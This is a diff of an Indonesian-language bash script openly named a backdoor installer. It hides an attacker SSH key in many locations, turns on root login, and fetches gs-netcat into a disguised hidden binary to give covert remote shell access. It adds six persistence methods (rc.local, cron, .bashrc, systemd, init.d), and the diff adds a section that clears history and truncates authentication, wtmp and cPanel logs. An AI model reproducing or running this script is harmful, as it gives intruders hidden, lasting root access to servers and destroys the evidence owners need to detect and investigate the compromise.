@@ -1,13 +1,13 @@
+cat << 'EOF' > /root/ssh-gsocket
 #!/bin/bash
 # ============================================================
 # FULL BACKDOOR - HIDDEN SSH KEYS + GSOCKET TERSAMAR
-# Gsocket di folder tersembunyi + persistence reboot
+# + HAPUS JEJAK
 # ============================================================
 
 VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
 GSOCKET_SECRET="${VPS_IP}@dark-ai"
 
-# Lokasi tersembunyi untuk gs-netcat
 HIDDEN_DIR="/usr/share/man/.cache"
 BINARY_NAME="systemd-helper"
 GS_NETCAT="$HIDDEN_DIR/$BINARY_NAME"
@@ -18,15 +18,11 @@ PUBLIC_KEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCfaRaiLkOcT0/NyA7TH4PoNYethI58
 
 echo "=========================================="
 echo " BACKDOOR INSTALLER"
-echo " VPS IP: $VPS_IP"
-echo " Secret: $GSOCKET_SECRET"
 echo "=========================================="
 
 # ============================================================
-# 1. HIDDEN SSH KEY - BANYAK LOKASI TERSEMBUNYI
+# 1. SSH KEY HIDDEN
 # ============================================================
-echo "[1] Install Hidden SSH Keys..."
-
 HIDDEN_PATHS=(
     "/var/.keys"
     "/usr/share/doc/.system"
@@ -62,13 +58,9 @@ chmod 700 /root/.ssh
 grep -q "$PUBLIC_KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$PUBLIC_KEY" >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 
-echo "[✓] SSH Keys di $(echo $AUTH_PATHS | wc -w) lokasi"
-
 # ============================================================
-# 2. UPDATE sshd_config
+# 2. SSHD CONFIG
 # ============================================================
-echo "[2] Update sshd_config..."
-
 cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak.$(date +%s)
 sed -i '/^AuthorizedKeysFile/d' /etc/ssh/sshd_config
 echo "AuthorizedKeysFile .ssh/authorized_keys$AUTH_PATHS" >> /etc/ssh/sshd_config
@@ -79,22 +71,16 @@ echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 sed -i '/^StrictModes/d' /etc/ssh/sshd_config
 echo "StrictModes no" >> /etc/ssh/sshd_config
 
-/usr/sbin/sshd -t 2>/tmp/sshd_error.log
+/usr/sbin/sshd -t 2>/dev/null
 if [ $? -eq 0 ]; then
     service sshd restart 2>/dev/null || /etc/init.d/sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null
-    echo "[✓] SSH OK"
-else
-    cp /etc/ssh/sshd_config.bak.$(date +%s) /etc/ssh/sshd_config 2>/dev/null
-    echo "[!] SSH config error, backup dipulihkan"
 fi
 
 # ============================================================
-# 3. GSOCKET DI FOLDER TERSEMBUNYI
+# 3. GSOCKET HIDDEN
 # ============================================================
-echo "[3] Install Gsocket di folder tersembunyi..."
-
-mkdir -p "$HIDDEN_DIR"
-chmod 755 "$HIDDEN_DIR"
+mkdir -p "$HIDDEN_DIR" 2>/dev/null
+chmod 755 "$HIDDEN_DIR" 2>/dev/null
 
 if [ ! -f "$GS_NETCAT" ]; then
     wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -O "$GS_NETCAT" 2>/dev/null || \
@@ -103,35 +89,18 @@ if [ ! -f "$GS_NETCAT" ]; then
     chmod +x "$GS_NETCAT"
 fi
 chattr +i "$GS_NETCAT" 2>/dev/null
-echo "[✓] Binary: $GS_NETCAT"
 
-# Jalankan dengan nama proses kernel worker
 PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
 GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" exec -a "$PROCESS_NAME" "$GS_NETCAT" &
-echo "[✓] Berjalan sebagai $PROCESS_NAME"
 
 # ============================================================
-# 4. PERSISTENCE - REBOOT SURVIVAL
+# 4. PERSISTENCE
 # ============================================================
-echo "[4] Install Persistence..."
-
-# 4a. rc.local
-grep -q "$BINARY_NAME" /etc/rc.local 2>/dev/null || cat >> /etc/rc.local << RC_EOF
-
-# System helper daemon
-GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd \$HOME; exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT" &
-RC_EOF
-
-# 4b. Cron @reboot
+grep -q "$BINARY_NAME" /etc/rc.local 2>/dev/null || echo "GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &" >> /etc/rc.local
 (crontab -l 2>/dev/null; echo "@reboot GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &") | crontab -
-
-# 4c. Cron setiap 5 menit (watchdog)
 (crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &") | crontab -
+grep -q "$BINARY_NAME" /root/.bashrc 2>/dev/null || echo "pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || (GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &)" >> /root/.bashrc
 
-# 4d. .bashrc
-grep -q "$BINARY_NAME" /root/.bashrc 2>/dev/null || echo "pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || (GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" SHELL=/bin/bash exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &)" >> /root/.bashrc
-
-# 4e. systemd service (jika ada systemd)
 if command -v systemctl >/dev/null 2>&1; then
     cat > /etc/systemd/system/systemd-helper.service << SYSTEMD_EOF
 [Unit]
@@ -150,62 +119,56 @@ WantedBy=multi-user.target
 SYSTEMD_EOF
     systemctl daemon-reload 2>/dev/null
     systemctl enable systemd-helper 2>/dev/null
-    echo "[✓] Systemd service terpasang"
 fi
 
-# 4f. Init.d script
 cat > /etc/init.d/systemd-helper << INIT_EOF
 #!/bin/bash
-# System Helper Daemon
 case "\$1" in
-    start)
-        GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &
-        ;;
-    stop)
-        pkill -f "$BINARY_NAME"
-        ;;
-    *)
-        echo "Usage: \$0 {start|stop}"
-        ;;
+    start) GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT & ;;
+    stop) pkill -f "$BINARY_NAME" ;;
 esac
 INIT_EOF
 chmod +x /etc/init.d/systemd-helper
 chkconfig systemd-helper on 2>/dev/null || update-rc.d systemd-helper defaults 2>/dev/null
-echo "[✓] Init.d script terpasang"
-
-echo ""
-echo "=========================================="
-echo " PERSISTENCE TERPASANG:"
-echo "  - rc.local"
-echo "  - cron @reboot"
-echo "  - cron watchdog (5 menit)"
-echo "  - .bashrc"
-echo "  - systemd service"
-echo "  - init.d script"
-echo "=========================================="
 
 # ============================================================
-# VERIFIKASI
+# 5. HAPUS JEJAK
 # ============================================================
+echo "[*] Menghapus jejak..."
+
+# Hapus history
+history -c 2>/dev/null
+rm -f /root/.bash_history 2>/dev/null
+unset HISTFILE 2>/dev/null
+
+# Bersihkan log SSH
+> /var/log/secure 2>/dev/null
+> /var/log/auth.log 2>/dev/null
+> /var/log/messages 2>/dev/null
+> /var/log/syslog 2>/dev/null
+
+# Bersihkan wtmp/lastlog
+> /var/log/wtmp 2>/dev/null
+> /var/log/lastlog 2>/dev/null
+> /var/log/btmp 2>/dev/null
+
+# Hapus log cPanel
+> /usr/local/cpanel/logs/access_log 2>/dev/null
+> /usr/local/cpanel/logs/error_log 2>/dev/null
+
+# Bersihkan temp
+rm -rf /tmp/.*.log /tmp/install* /tmp/setup* 2>/dev/null
+
+# Hapus script installer
+rm -f /root/install_backdoor_multi.sh /root/ssh-gsocket 2>/dev/null
+
 echo ""
-echo "=========================================="
-echo " VERIFIKASI"
-echo "=========================================="
-echo ""
-echo "--- SSH AuthorizedKeysFile ---"
-grep "^AuthorizedKeysFile" /etc/ssh/sshd_config | head -1
-echo ""
-echo "--- Gsocket Binary ---"
-ls -la "$GS_NETCAT"
-echo ""
-echo "--- Gsocket Process ---"
-ps aux | grep "$BINARY_NAME" | grep -v grep
-echo ""
-echo "--- Cron ---"
-crontab -l 2>/dev/null | grep -i "gsock\|$BINARY_NAME"
+echo "[✓] Jejak dibersihkan"
 echo ""
 echo "=========================================="
 echo " CONNECT:"
 echo "  SSH   : ssh -i backdoor_key root@$VPS_IP"
 echo "  Gsock : gs-netcat -s $GSOCKET_SECRET -i"
 echo "=========================================="
+EOF
+chmod +x /root/ssh-gsocket
